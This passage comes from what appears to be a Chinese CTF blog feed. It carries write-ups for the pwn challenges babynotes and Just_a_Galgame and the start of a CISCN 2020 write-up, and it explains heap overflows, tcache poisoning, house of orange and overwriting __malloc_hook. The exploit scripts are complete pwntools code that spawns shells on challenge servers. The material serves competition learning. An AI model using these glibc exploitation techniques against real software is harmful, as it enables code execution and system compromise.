bss - <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>])</span><br><span class="line">payload += flat([leave_ret])</span><br><span class="line">leave_message(payload)</span><br><span class="line">p.recvuntil(<span class="string">"done!\n\n"</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">8</span>)) - write_offset</span><br><span class="line">libc_system = libc_base + system_offset</span><br><span class="line">str_bin_sh = libc_base + str_bin_sh_offset</span><br><span class="line"></span><br><span class="line">payload = flat([pop_rdi, str_bin_sh, pop_rsi, <span class="number">0</span>, <span class="number">0</span>, ret, libc_system])</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">.text:0000000000400AA0 loc_400AA0:                             ; CODE XREF: __libc_csu_init+54↓j</span></span><br><span class="line"><span class="string">.text:0000000000400AA0                 mov     rdx, r15</span></span><br><span class="line"><span class="string">.text:0000000000400AA3                 mov     rsi, r14</span></span><br><span class="line"><span class="string">.text:0000000000400AA6                 mov     edi, r13d</span></span><br><span class="line"><span class="string">.text:0000000000400AA9                 call    ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8]</span></span><br><span class="line"><span class="string">.text:0000000000400AAD                 add     rbx, 1</span></span><br><span class="line"><span class="string">.text:0000000000400AB1                 cmp     rbp, rbx</span></span><br><span class="line"><span class="string">.text:0000000000400AB4                 jnz     short loc_400AA0</span></span><br><span class="line"><span class="string">.text:0000000000400AB6</span></span><br><span class="line"><span class="string">.text:0000000000400AB6 loc_400AB6:                             ; CODE XREF: __libc_csu_init+34↑j</span></span><br><span class="line"><span class="string">.text:0000000000400AB6                 add     rsp, 8</span></span><br><span class="line"><span class="string">.text:0000000000400ABA                 pop     rbx</span></span><br><span class="line"><span class="string">.text:0000000000400ABB                 pop     rbp</span></span><br><span class="line"><span class="string">.text:0000000000400ABC                 pop     r12</span></span><br><span class="line"><span class="string">.text:0000000000400ABE                 pop     r13</span></span><br><span class="line"><span class="string">.text:0000000000400AC0                 pop     r14</span></span><br><span class="line"><span class="string">.text:0000000000400AC2                 pop     r15</span></span><br><span class="line"><span class="string">.text:0000000000400AC4                 retn</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol><h1 id="babynotes"><a href="#babynotes" class="headerlink" title="babynotes"></a>babynotes</h1><h2 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h2><ol><li><p>reset 功能重新调用了一次 regist ，而 regist 中输入的 name 和 age 在 buffer 上连续，在 strcpy 的时候存在一次 heap overflow 的机会：</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">regist</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+18h] [rbp-38h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+28h] [rbp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x50</span>uLL);</span><br><span class="line">  motto = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x100</span>uLL);</span><br><span class="line">  dest = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x18</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input your name: "</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">read</span>(<span class="number">0</span>, &amp;s, <span class="number">0x18</span>uLL) == <span class="number">-1</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input your motto: "</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">read</span>(<span class="number">0</span>, &amp;v3, <span class="number">0x20</span>uLL) == <span class="number">-1</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input your age: "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%lld"</span>, &amp;v2);</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, &amp;s);</span><br><span class="line">  <span class="built_in">strncpy</span>(motto, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v3, <span class="number">0x20</span>uLL);</span><br><span class="line">  age = v2;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Done!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 可见age的位置在<code>strcpy(dest, &amp;s);</code>的时候也会同时被复制进去，因此可以覆盖下一个chunk的size。</p></li><li><p>利用 heap overflow 伪造 size ，形成 chunk overlap ，然后利用<code>show</code>leak出 libc 地址，再 tcache poisoning 打<code>__malloc_hook</code>为 onegadget 即可。</p></li><li><p>exp：</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">'123.56.170.202'</span>, <span class="number">43121</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">regit</span><span class="params">(name, motto, age)</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">"Input your name: "</span>, name)</span><br><span class="line">    p.sendafter(<span class="string">"Input your motto: "</span>, motto)</span><br><span class="line">    p.sendlineafter(<span class="string">"Input your age: "</span>, str(age))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, size)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Input index: "</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">"Input note size: "</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Input index: "</span>, str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"Note "</span> + str(idx) + <span class="string">": "</span>)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Input index: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, note)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"4"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Input index: "</span>, str(idx))</span><br><span class="line">    p.sendafter(<span class="string">"Input your note: "</span>, note)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reset</span><span class="params">(name, motto, age)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"5"</span>)</span><br><span class="line">    regit(name, motto, age)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"7"</span>)</span><br><span class="line"></span><br><span class="line">__malloc_hook_offset = libc.sym[<span class="string">"__malloc_hook"</span>]</span><br><span class="line">one_gadget_offset = <span class="number">0xf1207</span></span><br><span class="line"></span><br><span class="line">regit(<span class="string">"AAA"</span>, <span class="string">"AAA"</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x88</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x18</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x88</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>)) - <span class="number">0x58</span> - main_arena_offset</span><br><span class="line">__malloc_hook = libc_base + __malloc_hook_offset</span><br><span class="line">one_gadget = libc_base + one_gadget_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># heap overflow</span></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x18</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">reset(<span class="string">"A"</span> * <span class="number">0x18</span>, <span class="string">"B"</span> * <span class="number">0x18</span>, <span class="number">0x91</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># _malloc_hook</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x88</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">"A"</span> * <span class="number">0x18</span> + p64(<span class="number">0x71</span>) + p64(__malloc_hook - <span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">2</span>, <span class="string">'\x00'</span> * <span class="number">0x13</span> + p64(one_gadget))</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x28</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol><h1 id="Just-a-Galgame"><a href="#Just-a-Galgame" class="headerlink" title="Just_a_Galgame"></a>Just_a_Galgame</h1><h1 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h1><ol><li><p>由于<code>add</code>功能是<code>malloc(0x68)</code>，而<code>edit</code>是功能可以覆盖<code>read(0, (void *)(chunk_array[v4] + 0x60), 0x10uLL);</code>显然存在一个heap overflow可以覆盖size。</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v6 &lt;= <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Emmm...Alright. Thank you."</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  --v6;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"\nHotaru: Wow! Thanks~\n"</span>);</span><br><span class="line">  chunk_array[<span class="number">6</span> - v6] = (__int64)<span class="built_in">malloc</span>(<span class="number">0x68</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"[ You've hold some place in her heart! ]"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line"><span class="keyword">if</span> ( v7 &lt;= <span class="number">0</span> || v6 &gt; <span class="number">6</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"\nHotaru: Emmm...Sorry I should go home now. Maybe the next time.\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"\nHotaru: Okay~ Let's choose a movie!\n"</span>);</span><br><span class="line">  --v7;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"idx &gt;&gt; "</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( chunk_array[atoi((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;buf)] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"movie name &gt;&gt; "</span>);</span><br><span class="line">    v4 = atoi((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;buf);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, (<span class="keyword">void</span> *)(chunk_array[v4] + <span class="number">0x60</span>), <span class="number">0x10</span>uLL);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"\nHotaru: What a good movie! I like it~\n"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[ You've gained a lot favor of her! ]"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[ The movie is not exist. ]"</span>);</span><br><span class="line">    ++v7;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">continue</span>;</span><br></pre></td></tr></table></figure></li><li><p>注意到程序没有<code>delete</code>功能，那么就利用heap overflow覆盖top chunk的size，在利用house of orange，即利用<code>malloc(0x1000)</code>把old top chunk放入unsorted bin中：</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line"><span class="keyword">if</span> ( v8 &lt;= <span class="number">0</span> || v6 &gt; <span class="number">6</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"\nHotaru: Sorry, I think it's better for us to be friends.\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  --v8;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You are the apple of my eyes too!"</span>);</span><br><span class="line">  big_chunk = (__int64)<span class="built_in">malloc</span>(<span class="number">0x1000</span>uLL);</span><br><span class="line">  ++v7;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">continue</span>;</span><br></pre></td></tr></table></figure></li><li><p>然后从unsorted bin分配chunk，再利用<code>show</code>leak出libc地址；同时<code>edit</code>没有对下标进行检查，而且<code>Leave</code>功能读入的字符串的位置就在<code>bss</code>上 chunk array 的后面：</p> <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.bss:</span><span class="number">0000000000404060</span> <span class="comment">; __int64 chunk_array[7]</span></span><br><span class="line"><span class="symbol">.bss:</span><span class="number">0000000000404060</span> chunk_array     <span class="built_in">dq</span> ?                    <span class="comment">; DATA XREF: main+C3↑w</span></span><br><span class="line"><span class="symbol">.bss:</span><span class="number">0000000000404060</span>                                         <span class="comment">; main+146↑r ...</span></span><br><span class="line"><span class="symbol">.bss:</span><span class="number">0000000000404068</span>                 <span class="built_in">dq</span> ?</span><br><span class="line"><span class="symbol">.bss:</span><span class="number">0000000000404070</span>                 <span class="built_in">dq</span> ?</span><br><span class="line"><span class="symbol">.bss:</span><span class="number">0000000000404078</span>                 <span class="built_in">dq</span> ?</span><br><span class="line"><span class="symbol">.bss:</span><span class="number">0000000000404080</span>                 <span class="built_in">dq</span> ?</span><br><span class="line"><span class="symbol">.bss:</span><span class="number">0000000000404088</span>                 <span class="built_in">dq</span> ?</span><br><span class="line"><span class="symbol">.bss:</span><span class="number">0000000000404090</span>                 <span class="built_in">dq</span> ?</span><br><span class="line"><span class="symbol">.bss:</span><span class="number">0000000000404098</span> big_chunk       <span class="built_in">dq</span> ?                    <span class="comment">; DATA XREF: main+1F9↑w</span></span><br><span class="line"><span class="symbol">.bss:</span>00000000004040A0 msg             <span class="built_in">db</span>    ? <span class="comment">;               ; DATA XREF: main+270↑o</span></span><br><span class="line"><span class="symbol">.bss:</span>00000000004040A0                                         <span class="comment">; main+284↑o</span></span><br><span class="line"><span class="symbol">.bss:</span>00000000004040A1                 <span class="built_in">db</span>    ? <span class="comment">;</span></span><br><span class="line"><span class="symbol">.bss:</span>00000000004040A2                 <span class="built_in">db</span>    ? <span class="comment">;</span></span><br><span class="line"><span class="symbol">.bss:</span>00000000004040A3                 <span class="built_in">db</span>    ? <span class="comment">;</span></span><br><span class="line"><span class="symbol">.bss:</span>00000000004040A4                 <span class="built_in">db</span>    ? <span class="comment">;</span></span><br><span class="line"><span class="symbol">.bss:</span>00000000004040A5                 <span class="built_in">db</span>    ? <span class="comment">;</span></span><br><span class="line"><span class="symbol">.bss:</span>00000000004040A6                 <span class="built_in">db</span>    ? <span class="comment">;</span></span><br><span class="line"><span class="symbol">.bss:</span>00000000004040A7                 <span class="built_in">db</span>    ? <span class="comment">;</span></span><br><span class="line"><span class="symbol">.bss:</span>00000000004040A7 _bss            ends</span><br></pre></td></tr></table></figure><p> 所以利用<code>Leave</code>在<code>msg</code>处写入<code>__malloc_hook - 0x60</code>，然后利用<code>edit</code>打<code>_malloc_hook</code>为 onegadget 即可。</p></li><li><p>exp：</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">'123.56.170.202'</span>, <span class="number">52114</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"idx &gt;&gt; "</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">"movie name &gt;&gt; "</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bigchunk</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(str(idx) + <span class="string">": "</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">msg</span><span class="params">(message)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">'5'</span>)</span><br><span class="line">    p.sendafter(<span class="string">"\nHotaru: Won't you stay with me for a while? QAQ\n"</span>, message)</span><br><span class="line"></span><br><span class="line">main_arena_offset = <span class="number">0x3ebc40</span></span><br><span class="line">__malloc_hook_offset = libc.sym[<span class="string">"__malloc_hook"</span>]</span><br><span class="line">one_gadget_offset = <span class="number">0x10a45c</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># house of orange</span></span><br><span class="line">add() <span class="comment"># chunk 0</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">'A'</span> * <span class="number">8</span> + p64(<span class="number">0xD41</span>))</span><br><span class="line">bigchunk() </span><br><span class="line"></span><br><span class="line"><span class="comment"># leak</span></span><br><span class="line">add() <span class="comment"># chunk 1</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x660</span> - main_arena_offset</span><br><span class="line">__malloc_hook = libc_base + __malloc_hook_offset</span><br><span class="line">one_gadget = libc_base + one_gadget_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># __malloc_hook</span></span><br><span class="line">msg(p64(__malloc_hook - <span class="number">0x60</span>))</span><br><span class="line">edit(<span class="number">8</span>, p64(one_gadget))</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger</span></span><br><span class="line">add()</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;pwn比赛，但是太弱了只能做简单的题，难题只能赛后学习别人的wp了；最后跟着队里打进了前十，大哥们太猛了！就简单记录一下自己做得题好了，本来是想着复现一些题的，但是时间上目前比较吃紧，以后有时间再看吧（咕咕咕）。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Competition" scheme="https://n0nop.com/categories/Competition/"/>
    
    
      <category term="CTF" scheme="https://n0nop.com/tags/CTF/"/>
    
      <category term="pwn" scheme="https://n0nop.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>CISCN 2020 初赛 pwn</title>
    <link href="https://n0nop.com/2020/08/21/CISCN-2020-%E5%88%9D%E8%B5%9B-pwn/"/>
    <id>https://n0nop.com/2020/08/21/CISCN-2020-%E5%88%9D%E8%B5%9B-pwn/</id>
    <published>2020-08-21T09:06:42.000Z</published>
    <updated>2020-08-24T07:09:12.270Z</updated>
    
    <content type="html"><![CDATA[<p>本文首发于安全客：<a href="https://www.anquanke.com/post/id/215100" target="_blank" rel="noopener">https://www.anquanke.com/post/id/215100</a></p><p>pwn题全都没给libc，不过好在nofree那道题搞出来之后直接查出来libc的版本，后面就轻松很多了。wow这道题搞了很久，主要代码太长看得有点心累，再看解出题的队伍蛮多的就死磕了。</p><a id="more"></a><h1 id="babyjsc"><a href="#babyjsc" class="headerlink" title="babyjsc"></a>babyjsc</h1><p>这题我附件都没搞下来就被秒得稀烂了，最后队友说就是个python2会eval输入的内容（最后附件我也没搞下来，速度太慢了），反正是个水题。</p><h1 id="nofree"><a href="#nofree" class="headerlink" title="nofree"></a>nofree</h1><ol><li><p>只有两个功能，一个<code>new</code>（这个<code>malloc</code>是我自己命名的，只是为了方便看，实际上是通过<code>strdup</code>里的<code>malloc</code>进行分配的）：</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">new</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  result = get_idx();</span><br><span class="line">  v1 = result;</span><br><span class="line">  <span class="keyword">if</span> ( result != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"size: "</span>);</span><br><span class="line">    result = choice();</span><br><span class="line">    v2 = result;</span><br><span class="line">    <span class="keyword">if</span> ( result &gt;= <span class="number">0</span> &amp;&amp; result &lt;= <span class="number">0x90</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_QWORD *)&amp;chunk_array[<span class="number">16</span> * v1 + <span class="number">256</span>] = <span class="built_in">malloc</span>(result);</span><br><span class="line">      result = v2;</span><br><span class="line">      *(_QWORD *)&amp;chunk_array[<span class="number">16</span> * v1 + <span class="number">264</span>] = v2;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *__<span class="function">fastcall <span class="title">malloc</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">memset</span>(chunk_array, <span class="number">0</span>, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"content: "</span>);</span><br><span class="line">  read_str(chunk_array, a1);</span><br><span class="line">  <span 